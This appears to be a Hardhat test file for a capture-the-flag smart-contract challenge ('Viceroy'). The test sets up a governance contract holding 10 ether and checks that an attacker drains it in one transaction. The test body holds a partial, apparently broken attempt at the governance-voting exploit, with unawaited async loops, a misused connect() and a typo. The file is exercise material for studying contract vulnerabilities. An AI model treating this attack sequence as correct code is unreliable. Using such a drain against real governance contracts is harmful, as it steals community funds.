const { expect, use } = require("chai");
const { ethers } = require("hardhat");
const { BigNumber } = ethers;
const helpers = require("@nomicfoundation/hardhat-network-helpers");

use(require("chai-as-promised"));

describe("Viceroy", async function () {
    let attackerWallet, attacker, oligarch, governance, communityWallet;

    before(async function () {
        [_, attackerWallet] = await ethers.getSigners();

        // Name your contract GovernanceAttacker. It will be minted the NFT it needs.
        const AttackerFactory = await ethers.getContractFactory("GovernanceAttacker");
        attacker = await AttackerFactory.connect(attackerWallet).deploy();
        await attacker.deployed();

        const OligarchFactory = await ethers.getContractFactory("OligarchyNFT");
        oligarch = await OligarchFactory.deploy(attacker.address);
        await oligarch.deployed();

        const GovernanceFactory = await ethers.getContractFactory("Governance");
        governance = await GovernanceFactory.deploy(oligarch.address, {
            value: BigNumber.from("10000000000000000000"),
        });
        await governance.deployed();

        const walletAddress = await governance.communityWallet();
        communityWallet = await ethers.getContractAt("CommunityWallet", walletAddress);
        expect(await ethers.provider.getBalance(walletAddress)).equals(BigNumber.from("10000000000000000000"));
    });

    // prettier-ignore;
    it("conduct your attack here", async function () {
        await attacker.attack(governance.address);
        const randomAddress1 = ethers.Wallet.createRandom().address;
        const randomAddress2 = ethers.Wallet.createRandom().address;
        const randomAddress3 = ethers.Wallet.createRandom().address;
        const randomAddress4 = ethers.Wallet.createRandom().address;
        const randomAddress5 = ethers.Wallet.createRandom().address;
        const addressArray1 = [randomAddress1, randomAddress2, randomAddress3, randomAddress4, randomAddress5];

        const randomAddress6 = ethers.Wallet.createRandom().address;
        const randomAddress7 = ethers.Wallet.createRandom().address;
        const randomAddress8 = ethers.Wallet.createRandom().address;
        const randomAddress9 = ethers.Wallet.createRandom().address;
        const randomAddress10 = ethers.Wallet.createRandom().address;
        const addressArray2 = [randomAddress6, randomAddress7, randomAddress8, randomAddress9, randomAddress10];

        const governanceWithSignature = await governance.connect(attackerWallet);
        addressArray1.forEach(async (address) => {
            await governanceWithSignature.approveVoter(address);
        });

        await attacker.disapproveVoter(governance.address);

        addressArray2.forEach(async (address) => {
            await governanceWithSignature.approveVoter(address);
        });

        [...addressArray1, ...addressArray2].forEach(async (address) => {
            const signedGovernsance = await governance.connect(address);
            signedGovernsance.voteOnProposal(1, true, attacker);
        });
    });

    after(async function () {
        const walletBalance = await ethers.provider.getBalance(communityWallet.address);
        expect(walletBalance).to.equal(0);

        const attackerBalance = await ethers.provider.getBalance(attackerWallet.address);
        expect(attackerBalance).to.be.greaterThanOrEqual(BigNumber.from("10000000000000000000"));

        expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
            2,
            "must exploit in one transaction"
        );
    });
});
